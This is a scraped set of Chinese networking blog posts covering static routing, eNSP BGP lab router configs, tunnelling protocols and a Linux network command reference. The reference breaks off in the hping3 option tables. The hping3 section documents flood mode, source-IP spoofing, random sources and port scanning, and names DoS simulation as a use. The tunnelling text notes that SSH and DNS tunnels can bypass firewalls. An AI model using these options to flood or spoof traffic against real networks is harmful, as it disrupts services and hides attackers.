save即可保存\reNSP实验拓扑：静态路由.zip\nLinux中的路由 Linux系统的route 与ip route 命令用于显示和操作IP路由表（show/manipulate the IP routing table)。要实现两个不同的子网之间的通信，需要一台连接两个网络的路由器，或者同时位于两个网络的网关来实现。在Linux系统中，设置路由通常是为了解决以下问题：该Linux系统在一个局域网中，局域网中有一个网关，能够让机器访问internet，那么就需要将网关地址设置为该Linux机器的默认路由。需要注意的是，命令行执行的route操作不会持久化，当网卡重启或者机器重启之后，该路由就失效了；可以在/etc/rc.local中添加route命令来保证该路由设置永久有效。\nroute -n 命令显示的字段说明\n字段 说明 Destination 目标网段或是主机 Gateway 网关地址 [*标识目标是本机所属的网络，不需要路由] Genmask 网络掩码 flags 标记[可选如下]U - 路由是活动的H - 目标是一个主机G - 路由指向网关R - 恢复动态路由产生的表项D - 由动态路由后台程序动态的安装M - 由路由的后台程序修改! - 拒绝路由 Metric 路由距离，到达指定网络需要的中转数[Linux内核中没有引用] Ref 路由项引用册数[Linux内核中没有引用] Use 次路由项被路由软件查找的次数 Iface 该路由表项输出的路由接口 Linux开启IP转发功能，Linux主机可以是一个路由器 sysctl -w net.ipv4.ip_forward=1\n","permalink":"https://www.oomkill.com/2021/01/static-routing/","summary":"","title":"静态路由"},{"content":"\n实验文件： [calico BGP.zip](https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/calico BGP.zip)\nR1\nsystem-view sysname R1\rinterface l0\rip address 1.1.1.1 32\rinterface g0/0/0\rip address 10.1.0.1 24\rinterface g0/0/1\rip address 10.3.0.1 24\rbgp 100\rrouter-id 1.1.1.1\rpeer 10.1.0.2 as-number 123\rpeer 10.3.0.2 as-number 456\rdis this\rdis ip interface b\rR2\nsystem-view sysname R2\rinterface l0\rip address 2.2.2.2 32\rinterface g0/0/0\rip address 10.2.0.1 24\rinterface g0/0/1\rip address 10.4.0.1 24\rbgp 200\rrouter-id 2.2.2.2\rpeer 10.4.0.2 as-number 123\rpeer 10.2.0.2 as-number 456\rdis ip interface b\r从下至上配置\nR3\nsystem-view sysname R3\rinterface l0\rip address 3.3.3.3 32\rinterface g0/0/0\rip address 10.1.0.2 24\rinterface g0/0/1\rip address 10.5.0.1 24\rvlan 2\rint vlan 2\rip address 10.6.0.1 24\rin e0/0/0\rport link-type access port default vlan 2\rdis ip interface brief\rvlan 3\rint vlan 3\rip address 10.4.0.2 24\rin e0/0/1\rport link-type access port default vlan 3\rdis ip interface brief ospf router-id 3.3.3.3\rarea 0\rnetwork 10.1.0.0 0.0.0.255\rnetwork 10.5.0.0 0.0.0.255\rnetwork 3.3.3.3 0.0.0.0\rnetwork 10.4.0.0 0.0.0.255\rnetwork 10.6.0.0 0.0.0.255\rdis this\rbgp 123\rrouter-id 3.3.3.3\rpeer 5.5.5.5 as-number 123\rpeer 5.5.5.5 connect-interface l0\rpeer 6.6.6.6 as-number 123\rpeer 6.6.6.6 connect-interface l0\rdis this\rpeer 5.5.5.5 reflect-client\rpeer 6.6.6.6 reflect-client\rpeer 10.1.0.1 as-number 100\rpeer 10.4.0.1 as-number 200\rdis this\rR5\n注意这里OSPF宣告的路由，OSPF优先级高于BGP，此处不能宣告0.0.0.0 255.255.255.255\nsystem-view sysname R5\rinterface l0\rip address 5.5.5.5 32\rquit\rvlan 2\rint vlan 2\rip address 10.5.0.2 24\rin e0/0/0\rport link-type access port default vlan 2\rdis ip interface brief ospf router-id 5.5.5.5\rarea 0\rnetwork 5.5.5.5 0.0.0.0\rnetwork 10.5.0.0 0.0.0.255\rdis this\rbgp 123\rrouter-id 5.5.5.5\rpeer 3.3.3.3 as-number 123\rpeer 3.3.3.3 connect-interface l0\rdis this\rR6\nsystem-view sysname R6\rinterface l0\rip address 6.6.6.6 32\rquit\rvlan 2\rint vlan 2\rip address 10.6.0.2 24\rin e0/0/0\rport link-type access port default vlan 2\rdis ip interface brief ospf router-id 6.6.6.6\rarea 0\rnetwork 6.6.6.6 0.0.0.0\rnetwork 10.6.0.0 0.0.0.255\rdis this\rbgp 123\rrouter-id 6.6.6.6\rpeer 3.3.3.3 as-number 123\rpeer 3.3.3.3 connect-interface l0\rdis this\rR4\nsystem-view sysname R4\rinterface l0\rip address 4.4.4.4 32\rinterface g0/0/0\rip address 10.2.0.2 24\rinterface g0/0/1\rip address 10.7.0.1 24\rvlan 2\rint vlan 2\rip address 10.8.0.1 24\rin e0/0/0\rport link-type access port default vlan 2\rdis ip interface brief\rvlan 3\rint vlan 3\rip address 10.3.0.2 24\rin e0/0/1\rport link-type access port default vlan 3\rdis ip interface brief ospf router-id 4.4.4.4\rarea 0\rnetwork 10.2.0.0 0.0.0.255\rnetwork 10.3.0.0 0.0.0.255\rnetwork 4.4.4.4 0.0.0.0\rnetwork 10.7.0.0 0.0.0.255\rnetwork 10.8.0.0 0.0.0.255\rdis this\rbgp 456\rrouter-id 4.4.4.4\rpeer 7.7.7.7 as-number 456\rpeer 7.7.7.7 connect-interface l0\rpeer 8.8.8.8 as-number 456\rpeer 8.8.8.8 connect-interface l0\rdis this\rpeer 7.7.7.7 reflect-client\rpeer 8.8.8.8 reflect-client\rpeer 10.3.0.1 as-number 100\rpeer 10.2.0.1 as-number 200\rdis this\rR7\nsystem-view sysname R7\rinterface l0\rip address 7.7.7.7 32\rquit\rvlan 2\rint vlan 2\rip address 10.7.0.2 24\rin e0/0/0\rport link-type access port default vlan 2\rdis ip interface brief ospf router-id 7.7.7.7\rarea 0\rnetwork 7.7.7.7 0.0.0.0\rnetwork 10.7.0.0 0.0.0.255\rdis this\rbgp 456\rrouter-id 7.7.7.7\rpeer 4.4.4.4 as-number 456\rpeer 4.4.4.4 connect-interface l0\rdis this\rR8\nsystem-view sysname R8\rinterface l0\rip address 8.8.8.8 32\rinterface g0/0/0\rip address 10.8.0.2 24\rdis ip interface brief ospf router-id 8.8.8.8\rarea 0\rnetwork 8.8.8.8 0.0.0.0\rnetwork 10.8.0.0 0.0.0.255\rdis this\rbgp 456\rrouter-id 8.8.8.8\rpeer 4.4.4.4 as-number 456\rpeer 4.4.4.4 connect-interface l0\rdis this\r在R7与R5各添加一条路由\ninterface L11\rip address 77.77.77.77 32\rquit\rbgp 456\rnetwork 77.77.77.77 255.255.255.255\rinterface L11\rip address 55.55.55.55 32\rquit\rbgp 123\rnetwork 55.55.55.55 255.255.255.255\r可以看到R1 R2 与 R6 R8都通过对应的bgp协议学习到相应的路由。\n[R2]dis bgp routing-table BGP Local router ID is 2.2.2.2 Status codes: * - valid, \u0026gt; - best, d - damped,\rh - history, i - internal, s - suppressed, S - Stale\rOrigin : i - IGP, e - EGP, ? - incomplete\rTotal Number of Routes: 4\rNetwork NextHop MED LocPrf PrefVal Path/Ogn\r*\u0026gt; 55.55.55.55/32 10.4.0.2 0 123i\r* 10.2.0.2 0 456 100 123i\r*\u0026gt; 77.77.77.77/32 10.2.0.2 0 456i\r* 10.4.0.2 0 123 100 456i\r[R6-bgp]dis bgp routing-table BGP Local router ID is 6.6.6.6 Status codes: * - valid, \u0026gt; - best, d - damped,\rh - history, i - internal, s - suppressed, S - Stale\rOrigin : i - IGP, e - EGP, ? - incomplete\rTotal Number of Routes: 2\rNetwork NextHop MED LocPrf PrefVal Path/Ogn\r*\u0026gt;i 55.55.55.55/32 5.5.5.5 0 100 0 i\r*\u0026gt;i 77.77.77.77/32 10.1.0.1 100 0 100 456i\r[R6-bgp]\r遇到问题：\nvlan未启动，需要查看对应绑定的端口是否正确\nospf配置错误，undo ospf 1 重启ospf\n","permalink":"https://www.oomkill.com/2021/01/ensp-calico-bgp/","summary":"","title":"使用eNSP构建calico BGP网络"},{"content":"隧道技术概要 隧道技术（Tunneling）是网络基础设置在网络之间传递数据的方式，使用隧道技术传递可以是不同协议的数据包，隧道协议将这些其他协议的数据包重新封装在新的包头中发送。被封装的数据包在隧道的两个端点之间通过网络进行路由，被封装数据包在网络上传递时所经历的逻辑路径称为隧道。\n简单来说，隧道技术是一类网络协议，是将一个数据包封装在另一个数据包中进行传输的技术；**使用隧道的原因是在不兼容的网络上传输数据，或在不安全网络上提供一个安全路径。**通过网络隧道技术，可以使隧道两端的网络组成一个更大的内部网络。（把不支持的协议数据包打包成支持的协议数据包之后进行传输）。\n隧道协议 要创建隧道，隧道的客户机和服务器双方必须使用相同的隧道技术，隧道协议有二层隧道协议与三层隧道协议两类。\n二层隧道协议对应OSI模型中数据链路层，使用 帧 作为数据交换单位，PPTP、L2TP、L2F都属于二层隧道协议。是将数据封装在点对点协议的帧中通过互联网络发送。\n三层隧道协议对应OSI模型中网络层，使用 包 作为数据交换单位，GRE、IPSec 都属于三层隧道协议。都是数据包封装在附加的IP包头中通过IP网络传送。\n在例如VxLAN，工作在传输层和网络层之间。具体来说，将运行在用户数据报协议 (UDP) 和网络数据报协议 (IP) 之间，以便在网络中建立安全的通信通道。\n网络隧道技术应用 隧道在Linux 中应用 IP隧道是指一种可在两网络间进行通信的通道。在该通道里，会先封装其他网络协议的数据包，之后再传输信息。\nLinux原生共支持5种IPIP隧道：\nipip: 普通的IPIP隧道，就是在报文的基础上再封装成一个IPv4报文 gre: 通用路由封装（Generic Routing Encapsulation），定义了在任意一种网络层协议上封装其他任意一种网络层协议的机制，所以对于IPv4和IPv6都适用 sit: sit模式主要用于IPv4报文封装IPv6报文，即IPv6 over IPv4 isatap: 站内自动隧道寻址协议（Intra-Site Automatic Tunnel Addressing Protocol），类似于sit也是用于IPv6的隧道封装 vti: 即虚拟隧道接口（Virtual Tunnel Interface），是一种IPsec隧道技术 像IPVS/LVS中的 Virtual Server via IP Tunneling，就是使用了IPIP隧道\nSSH隧道技术 SSH提供了一个重要功能，称为转发 forwarding 或者称为隧道传输tunneling，它可以通过加密频道将明文流量导入隧道中，在创建SSH隧道时， SSH客户端要设置并转交一个特定本地端口号到远程机器上；一旦SSH隧道创建，用户可以连到指定的本地端口号以访问网络服务。本地端口号不用与远地端口号一样。\nSSH隧道主要使用场景一般为 规避防火墙、加密网络流量\n规避防火墙，SSH隧道可以使一个被防火墙阻挡的协议可被包在另一个没被防火墙阻挡的协议里，这技巧可用来逃避防火墙政策。而这种操作符合“数据包封装在另一个数据包中进行传输的技术”，故称为SSH隧道技术。\nSSH隧道类型 在ssh连接的基础上，指定 ssh client 或 ssh server 的某个端口作为源地址，所有发至该端口的数据包都会透过ssh连接被转发出去；至于转发的目标地址，目标地址既可以指定，也可以不指定，如果指定了目标地址，称为定向转发，如果不指定目标地址则称为动态转发：\n定向转发\n定向转发把数据包转发到指定的目标地址。目标地址不限定是ssh client 或 ssh server，既可以是二者之一，也可以是二者以外的其他机器。\n动态转发\n动态转发不指定目标地址，数据包转发的目的地是动态决定的。\n本地端口转发 本地转发中的本地是指将本地的某个端口(1024-65535)通过SSH隧道转发至其他主机的套接字，这样当我们的程序连接本地的这个端口时，其实间接连上了其他主机的某个端口，当我们发数据包到这个端口时数据包就自动转发到了那个远程端口上了\n远程端口转发 远程转发和本地很相似，原理也差不多，但是不同的是，本地转发是在本地主机指定的一个端口，而远程转发是由SSH服务器经由SSH客户端转发，连接至目标服务器上。本质一样，区别在于需要转发的端口是在远程主机上还是在本地主机上\n现在SSH就可以把连接从（39.104.112.253:80）转发到（10.0.0.10:85）。\n动态端口转发 定向转发（包括本地转发和远程转发）的局限性是必须指定某个目标地址，如果需要借助一台中间服务器访问很多目标地址，一个一个地定向转发显然不是好办法，这时就要用的是ssh动态端口转发，它相当于建立一个SOCKS服务器。各种应用经由SSH客户端转发，经过SSH服务器，到达目标服务器，不固定端口。\nSSH隧道的本质 SSH隧道可以被认为是一种应用层隧道，与其他隧道类型（如IPIP, VxLAN）不同的是，SSH隧道是基于SSH协议的一种应用，而IPIP, VxLAN这种，则是基于IP协议，UDP协议的一种封包机制。\nSSH（Secure Shell）是一种网络协议，支持远程登录和其他安全网络服务的加密通信。SSH隧道属于SSH协议中的一种应用场景，用于在SSH加密连接上建立通信隧道。SSH隧道允许用户通过加密终端 (SSH客户端) 和远程服务之间的连接，在不暴露底层网络协议的信息（例如IP地址、端口号等）的情况下，传输数据。\nSSH隧道工作方式如下：\n首先，在本地主机和目标服务器之间建立SSH连接，SSH连接是一条安全加密的连接管道，连接过程中对数据进行加密传输。 连接建立后，通过SSH隧道在本地主机和目标服务器之间建立一个TCP连接，并将本地主机上的数据通过SSH隧道加密传输到目标服务器，目标服务器接收数据，解密后将数据传输到最终目的地。 同样，当接收数据时，目标服务器会将数据加密再通过SSH隧道传输回本地主机。 由于SSH隧道在SSH连接上建立通信隧道，因此可以将其视为应用层隧道。应用层隧道是在应用层协议上建立的隧道，用于将应用程序传输的数据加密传输到目标地址。SSH隧道给用户提供了一种安全的数据通信方法，在安全性上比普通TCP/IP连接更具有优势。\nSSH隧道也可以成为一种代理模式，常用于越过不可访问的网络时使用\n图：SSH隧道应用图解\rSource：https://infosecwriteups.com/bypass-the-firewall-with-ssh-tunnelling-711fa78ea97f\n其他隧道协议 对于隧道，上面也提到了，隧道就是网络数据包封包一种协议，那就是说很多常见的协议其实都是隧道技术\n工作与数据链路层的隧道技术： PPP隧道协议（Point-to-Point Protocol）：PPP隧道协议是一种在两个点之间建立可靠连接的协议，它能够在一条串行线路上同时传输多种网络层协议。PPP隧道协议通过在两个点之间建立隧道，将其他协议的数据封装起来进行传输。 L2TP协议（Layer 2 Tunnel Protocol）：L2TP协议是一种在不安全的公共网络上传输数据的加密协议，常用于建立VPN（Virtual Private Network）隧道。L2TP协议将PPP协议属性和L2TP控制消息封装在IP（Internet Protocol）数据报中。 PPTP协议（Point-to-Point Tunneling Protocol）：PPTP协议是一种在不安全的公共网络上传输数据的加密协议，也常用于建立VPN隧道。PPTP协议通过在数据包中添加PPTP头和PPP协议数据负载来传输数据。 GRE协议（Generic Routing Encapsulation）：GRE协议是一种通用路由封装协议，它可以将其他协议的数据封装在IP数据报中进行传输。GRE协议主要用于连接不同类型的网络，通常用于建立VPN隧道。 工作与网络层的隧道协议： 负载均衡协议 (LBP) 是一种在网络层以上实现的协议，用于在二层 (链路层) 上实现数据包的转发。LBP 可以将数据包转发到多个服务器上，从而实现负载均衡。LBP 可以用于实现网站负载均衡、存储集群等功能。 协议映射协议 (PMP) 是一种在网络层以下实现的协议，用于在网络层以上实现数据包的映射。PMP 可以将一个数据包映射到另一个数据包中，从而实现数据包的转发。PMP 可以用于实现虚拟专用网络 (Virtual Private Network,VPN) 和防火墙等功能。 虚拟隧道协议 (Virtual Tunneling Protocol,VTP) 是一种在网络层以下实现的协议，用于在网络中创建和管理隧道。VTP 可以将一个网络中的多个子网互联，使得数据包可以在这些子网之间传输。VTP 可以用于实现数据包的路由、负载均衡和安全性等方面。 工作与应用层的隧道技术： HTTP隧道：HTTP隧道通过HTTP连接创建隧道，将其他协议的数据封装在HTTP报文中，传输到目标地址。HTTP隧道通常用于访问受限制的服务器，如防火墙后的服务器。 SSL/TLS隧道：SSL/TLS隧道也是基于加密传输的应用层隧道。通过SSL/TLS加密传输，将通信数据封装在加密连接中，传输到目标服务器。SSL/TLS隧道通常用于保护Web应用程序中传输的机密数据。 SOCKS代理隧道：SOCKS代理隧道是一种应用层代理协议，用于将流量转发到目标地址并代理转发返回数据。SOCKS代理隧道通常用于隐藏客户端的真实IP地址和身份。 DNS隧道：DNS隧道是通过将数据封装在DNS请求或响应中来传输数据的应用层隧道。DNS隧道通常被用于绕过安全防护措施或访问受限制的服务器。 CCP常提到的“非法信道”中的“信道”和“隧道”是一样的吗？ 首先，“信道”和“隧道” 是两种不同的概念，就和“男人”和“女人”一样，同属于人但完全不同，常见的表示形式如下：\n意义不同：信道是指物理媒介或虚拟路径，用于数据的传输，例如网络电缆或无线信道。隧道则是一种逻辑隧道，通过在底层通信协议的基础上创建加密通道来传输数据。 位置不同：信道通常是指在通信的物理媒介上的传输路径，而隧道则是在信道之上的OSI模型层协上创建加密通道的逻辑概念。 传输方式不同：信道是直接用于传输数据的物理媒介，信号通过信道进行传输；隧道则是在传输数据时，将数据封装成新的协议格式，通过信道进行加密传输。 使用场景不同：信道常用于介质访问控制、传输层控制、传输介质选择等方面，例如在局域网中使用以太网电缆传送数据。隧道则通常用于保障企业内部网络安全、建立虚拟专用网络、跨越防火墙等隧道服务需求。 技术特点不同：信道是一种物理层或数据链路层技术，而隧道是一种应用层或数据链路层技术。 ","permalink":"https://www.oomkill.com/2021/01/network-tunnel-technology/","summary":"","title":"网络隧道技术"},{"content":"Overview 作为系统管理员或程序员，经常需要诊断分析和解决网络问题，而配置、监控与保护网络有助于发现问题并在事情范围扩大前得意解决，并且网络的性能与安全也是管理与诊断网络的重要部分。本文将总结常用与Linux网络管理的命令与使用示例，保持长期更新与更正。\nIP iproute2 包含网络、路由、ARP缓存等的管理与配置的ip命令，用来取代传统的 ifconfig 与 route；ip 使用第二个参数，指定在对象执行的操作（例如，add delete show）。\nip 命令是配置网络接口的强大工具，任何 Linux 系统管理员都应该知道。它用于启动或关闭接口、分配和删除地址和路由、管理 ARP 缓存等等。\nip 常用的子命令有：\nlink (l) 网络接口管理 address (a) IP地址管理 route (r) 路由表管理 neigh (n) arp表管理 各系统下的包名与安装\nUbuntu/Debian: iproute2 ；apt install iproute2 CentOS/Fedora: iproute2 ；yum install -y iproute2 Apline：iproute2 ；apk add iproute2 ip link ip link 用于管理和显示网络接口\n获取网络接口信息ip link show 查看特定设备信息\nip link show dev [device] 查看所有网络接口的统计信息（如传输或丢弃的数据包，错误等等）：\nip -s link 查看单个网络接口的类似信息：\nip -s link ls [interface] 例如\n$ ip -s link ls eth0 2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc fq state UP mode DEFAULT group default qlen 1000 link/ether da:78:c8:7a:fb:26 brd ff:ff:ff:ff:ff:ff RX: bytes packets errors dropped overrun mcast 38626072259 324723879 0 347316 0 0 TX: bytes packets errors dropped carrier collsns 13404948080 6829250 0 0 0 0 如果需要显示更多的详情，可以再添加一个 -s\nip -s -s link ls [interface] 仅查看启动（运行）的接口列表\nip link ls up 修改网络接口信息 ip link set 查看 ip link 的帮助\nip link help 启动/关闭网络接口\nip link set [interface] up/down ip link 可以修改设备传输队列的长度\nip link set txqueuelen [number] dev [interface] 设置 MTU (Maximum Transmission Unit) 来提高网络性能\nip link set mtu [number] dev [interface] ###查看与管理IP地址 ip addr\n显示所有设备\nip addr 列出网络接口与IP地址\nip addr show 查看单个网络设备的信息\nip addr show dev [interface] 列出 IPv4/IPv6 地址\nip -4 addr ip -6 addr 在Linux中添加网络地址\nip addr add [ip_address] dev [interface] 添加广播地址\nip addr add brd [ip_address] dev [interface] 删除接口上的网络地址\nip addr del [ip_address] dev [interface] 管理路由表 ip route 显示路由表 ip route list ip route ip route list 选择范围；上述命令列出内核内所有路由条目，如果想要缩小范围可以使用选择器 SELECTOR\n语法：ip route list SELECTOR\nSELECTOR:\nroot：[ local | main | default | all | NUMBER ]\nmatch：\n[ match PREFIX ]\nip route list match 10 exact： [ exact PREFIX ]\nTABLE\n[ table TABLE_ID ] [ local | main | default | all | NUMBER ]\nip route list table local broadcast 127.0.0.0 dev lo proto kernel scope link src 127.0.0.1 local 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1 local 127.0.0.1 dev lo proto kernel scope host src 127.0.0.1 broadcast 127.255.255.255 dev lo proto kernel scope link src 127.0.0.1 broadcast 195.133.10.0 dev eth0 proto kernel scope link src 195.133.11.43 local 195.133.11.43 dev eth0 proto kernel scope host src 195.133.11.43 broadcast 195.133.11.255 dev eth0 proto kernel scope link src 195.133.11.43 PROTO\n[ proto RTPROTO ] [ kernel | boot | static | NUMBER ]\nip route list proto static TYPE\n[ type TYPE ] { unicast | local | broadcast | multicast | throw |unreachable | prohibit | blackhole | nat }\nip route list type multicast SCOPE\n[ scope SCOPE ] [ host | link | global | NUMBER ]\nip route list scope link 169.254.0.0/16 dev eth0 metric 1002 172.16.0.0/20 dev eth0 proto kernel src 172.16.0.2 修改路由表 ip route add/del 在指定设备上添加路由条目\nip route add [ip_address] dev [interface] 通过网关添加新路由\nip route add [ip_address] via [gatewayIP] 通过本地网关为所有地址添加默认路由\nip route add default [ip_address] dev [device] ip route add default [network/mask] via [gatewayIP] 删除已经存在的路由表\nip route del [ip_address] ip route del default ip route del [ip_address] dev [interface] ARP地址表管理 ip neighbor 显示arp 条目 ip neigh show 显示系统中设备的MAC地址及其状态。设备存在的状态：\n状态 说明 REACHABLE 在超时过期之前有效且可访问的条目 PERMANENT 管理员才能删除的永久条目 STALE 有效但无法访问的条目；为了检查它的状态，内核在第一次传输时检查 例如\nip neigh show 192.168.10.1 dev eth0 lladdr 00:1f:ce:72:bd:8c REACHABLE 46.17.40.155 dev eth0 lladdr c4:71:fe:f1:9f:3f STALE 2a00:b700:3::1 dev eth0 lladdr 00:1f:ce:72:bd:8c router STALE fe80::f0c5:a5ff:fee8:2aa4 dev eth0 lladdr f2:c5:a5:e8:2a:a4 router STALE fe80::a48a:1eff:fe35:c2f7 dev eth0 lladdr a6:8a:1e:35:c2:f7 router STALE fe80::4c4d:b3ff:fe44:fd58 dev eth0 lladdr 4e:4d:b3:44:fd:58 router STALE fe80::4c33:dfff:fe92:9f2f dev eth0 lladdr 4e:33:df:92:9f:2f router STALE fe80::21f:ceff:fe72:bd8c dev eth0 lladdr 00:1f:ce:72:bd:8c router STALE 修改arp条目 ip neigh add/del ip neigh add [ip_address] dev [interface] ip neigh del [ip_address] dev [interface] traceroute traceroute 可以追踪数据传输是如何从本地传输到远程的。一个典型的例子是网页的访问。在互联网上加载一个网页需要数据流经一个网络和许多路由器。traceroute 可以显示所采用的路由以及网络上路由器的IP和主机名。它可以应用于排查网络延迟或诊断网络问题。\n各系统下的包名与安装\nUbuntu/Debian: traceroute ；apt install traceroute -y CentOS/Fedora: traceroute ；yum install -y traceroute Apline：busybox ；apk add busybox 追踪网络主机的路由 traceroute host traceroute baidu.com traceroute to baidu.com (220.181.38.148), 30 hops max, 60 byte packets 1 * 9.31.61.129 (9.31.61.129) 1.795 ms * 2 9.31.123.98 (9.31.123.98) 0.907 ms 1.179 ms 1.416 ms 3 10.196.18.109 (10.196.18.109) 0.866 ms 10.196.18.125 (10.196.18.125) 1.085 ms * 4 10.162.33.5 (10.162.33.5) 1.297 ms 10.200.16.169 (10.200.16.169) 0.774 ms 10.196.92.109 (10.196.92.109) 1.218 ms 5 10.162.32.145 (10.162.32.145) 1.539 ms 1.431 ms 10.162.32.149 (10.162.32.149) 1.310 ms 6 * * * 7 58.63.249.45 (58.63.249.45) 7.320 ms * 121.14.50.25 (121.14.50.25) 7.859 ms 8 * * 113.96.4.121 (113.96.4.121) 4.887 ms 9 202.97.22.149 (202.97.22.149) 32.481 ms 202.97.22.153 (202.97.22.153) 32.676 ms 10 36.110.245.206 (36.110.245.206) 36.928 ms 36.110.247.54 (36.110.247.54) 37.593 ms 36.110.245.82 (36.110.245.82) 41.254 ms 11 36.110.245.161 (36.110.245.161) 33.749 ms * 37.905 ms 12 * * * 13 * * 220.181.182.170 (220.181.182.170) 42.998 ms 14 * * * 15 * * * 16 * * * 17 * * * 18 * * * 19 * * * 20 * * * 21 * * * 22 * * * 23 * * * 24 * * * 25 * * * 26 * * * 27 * * * 28 * * * 29 * * * 30 * * * 第一行显示要访问的主机名和ip、traceroute将尝试到主机的最大跃点数以及要发送的字节数据包的大小。\n每行列出到达目的地的一个跳跃点。给出主机名与主机名的ip，然后是数据包到达主机并返回发起计算机所需的时间。默认情况下，traceroute 为每个主机发送三个数据包，因此列出了三个响应时间。\n星号 * 表示丢失的数据包。这意味着网络中断、大量流量导致网络拥塞或防火墙丢弃流量。\n追踪IPv6协议 traceroute -6 ipv6.google.com 忽略主机名与IP的映射 使用-n选项在traceroute中禁用IP地址映射。\ntraceroute -n qq.com traceroute to qq.com (183.3.226.35), 30 hops max, 60 byte packets 1 9.31.61.129 0.908 ms 1.159 ms 1.537 ms 2 9.31.122.210 1.061 ms 0.837 ms 1.421 ms 设置相应等待时间 使用 -w 选项在traceroute 中配置响应等待时间，支持指定等待对探测的响应的时间（秒为单位）。\ntraceroute -w 1 -n qq.com 使用特定的网络接口 使用-i选项设置traceroute应使用的网络接口，如果未设置，则根据路由表选择接口。\ntraceroute -w 1 -n -i eth0 qq.com ping Ping是一种简单、广泛使用的跨平台网络工具，用于测试主机是否可以在Internet协议（IP）网络上访问。它的工作原理是向目标主机发送网络控制消息协议Internet Control Message Protocol (ICMP) ECHO_REQUEST，目标节点等待并回复 ECHO_RESPONSE。\n可以使用ping 测试两节点间的网络通信，可以做到：\n目标主机是否可用， 测量数据包到达目标主机并返回计算机所需的时间（与目标主机通信的往返时间（rtt）），以及数据包丢失的百分比。 各系统下的安装\nUbuntu/Debian: iputils-ping ；apt install iputils-ping CentOS/Fedora: iputils ；yum install -y iputils Apline：iputils ；apk add iputils 使用参数\n参数 说明 -c 指定发送ECHO_REQUEST的请求数 -i 设置包与包之间的间隔 ping -i 3 -c 5 www.google.com -f flood ping，检测高负载下的响应，需要有root权限 -b 允许ping一个广播地址 -t 限制ping遍历的网络跳跃数（TTL Time-to-live），收到数据包的每个路由器从计数中至少减去 1，如果大于 0，路由器会将数据包转发到下一跳，否则它会丢弃它并将 ICMP 响应返回。 -s 设置ping时的数据包大小（单位 bytes），这将导致提供的总数据包大小加上ICMP头的8个额外字节。 -l 发送预加载数据包（先发不等待回复的数据包），大于3需要root权限 -W 设置等待相应时间，单位秒 -w 设置超时时间，超时退出，单位秒 -d debug模式 -v 显示详细输出 -A 更快的在两节点间包往返的时间，非特权用户最小为200ms hping hping一个具有可嵌入tcl脚本功能的 TCP/IP包伪造工具。，主要用于创建或生成网络数据包以测试网络、服务或系统性能。 hping 是由不同实体开发的旧工具，并以 hping2 或 hping3 等新版本命名。 在大多数情况下，您可以使用操作系统提供的命令，可以是 hping 或 hping2 或 hping3。 hping 名称源自 ping 命令名称。hping3 是另一种用于扫描网络的工具。它在kali linux中默认是DOS攻击软件之一。\nhping支持TCP、UDP、ICMP、raw-IP等协议用于不同的用例。通过使用hping，可以创建具有不同选项的不同协议包。hping主要可以用作。\n创建原始IP数据包 生成指定数量的数据包 设置包发送间隔 指定传输网络接口 创建和生成TCP数据包 创建和生成UDP数据包 创建和生成IP数据包 创建和生成ICMP数据包 设置MTU值 设置碎片并创建碎片或未碎片的数据包 设置数据包的有效负载或数据大小 hping的常用场景\n模拟DOS和DDOS攻击 测试防火墙和TCP、UDP、IP等协议的防火墙配置 TCP和UDP端口扫描 测试网络设备的配置，如碎片、MTU等。 用于列出中间主机的高级跟踪路由 远程操作系统指纹识别和检测 远程正常运行时间决策 TCP/IP协议实现与栈测试审计 各系统下的安装\nUbuntu/Debian: hping3 ；apt install hping3 CentOS/Fedora: hping3 ；yum install epel-release \u0026amp;\u0026amp; yum install -y hping3 Apline：hping3 ；apk add hping3 --update-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing 参数说明 基础参数\n参数选项 参数说明 -c --count [count] 发送数据包的次数 关于countreached_timeout 可以在hping2.h里编辑 -i --interval 每个包发送间隔时间(单位是毫秒) 缺省时间是1秒,此功能在增加传输率上很重要。\n-i 1 为1s -i u1 为1us （微秒） 即每秒发送1000000包 --fast 为 -i u10000 的别名，即1秒发送10个包 --faster 为 -i u1 的别名，但实际上发送的包取决于计算机的速度 --flood 尽可能快速的发送包，不关注收到的恢复，要比 -i u0 快 -I --interface [interface name] 指定默认的路由接口，在linux中，hping3使用默认路由接口。可以使用 -I 接网络接口的完整名称，如 eth0 -q -quiet 安静输出。除了启动时和完成时的摘要信息外，不输出任何内容。 -n -nmeric 数字化输出主机地址 协议选项\n默认情况下，hping使用的为tcp协议\n选项 说明 -0 --rawip 原始IP模式，此模式下，hping3将发送IP头。 -1 --icmp ICMP模式，默认情况下hping3将发送ICMP回显请求。 -2 --udp UDP模式，默认情况下，hping3将向目标主机的0端口发送UDP -8 --scan 端口扫描，在该模式下，需要提供一组端口，如 1,2,3 端口组以 , 分隔\n端口范围：start-end 如 1000-2000 特殊字符：all 表示所有端口；know ：包含 /etc/services 中的所有端口\n组合写法：hping --scan 1-1000,8888,known -S www.baidu.com -9 --listen signature 监听模式，此模式下 hping3 等待包含签名的数据包并从签名端转储到数据包的结尾处。 IP相关选项\n参数 说明 -a --spoof hostname 此选项可以伪造源IP地址，可确保目标不会获得真实IP地址，必然性的响应将被发送到伪造的地址处。 --rand-source 此选项开启随机源模式。hping将发送带有随机源地址的数据包。 --rand-dest 此选项开启随机目标模式。hping将数据包发送到随机目标地址如，当使用随机目标地址时，可以使用x 作为范围，所有出现的 x 都将呗替换为0-255之间的随机数。如10.0.0.x。可以使用--debug 选项查看生成的随机地址。注意：使用此选项，hping无法检测数据包的正确传出接口，应使用 -I 选项指定网络接口。 -t --ttl 此选项可以设置传出数据包的TTL（生存时间） -N id 设置IP字段的随机值 -H --ipproto 在RAW IP模式中设置IP协议 -r --rel ip id等增量 -m –mtu 设置虚拟最大传输单元 icmp选项\n参数 说明 -C --icmptype type 设置icmp类型，默认为icmp echo reques。 --icmp-ipver 设设置包含在ICMP数据中的IP头的IP版本，默认值为4。 --icmp-ipproto 设置包含在ICMP数据中的IP头的IP协议，默认为TCP。 TCP/UDP选项\n参数 说明 -s --baseport [src port] 随机源端口 -p --destport [dest port] 设置目标端口\n+ 目标端口将随着收到的每个回复而增加\n++ 目标端口每发送数据包都会增加 \u0026ndash;keep 保持源端口不边 -w \u0026ndash;win 设置tcp窗口大小，默认64 -F \u0026ndash;fin 设置 tcp fin标记 -S \u0026ndash;syn 设置 tcp SYN标记 -R \u0026ndash;rst 设置 tcp rst标记 -P \u0026ndash;push 设置 tcp PUSH标记 -A \u0026ndash;ack 设置 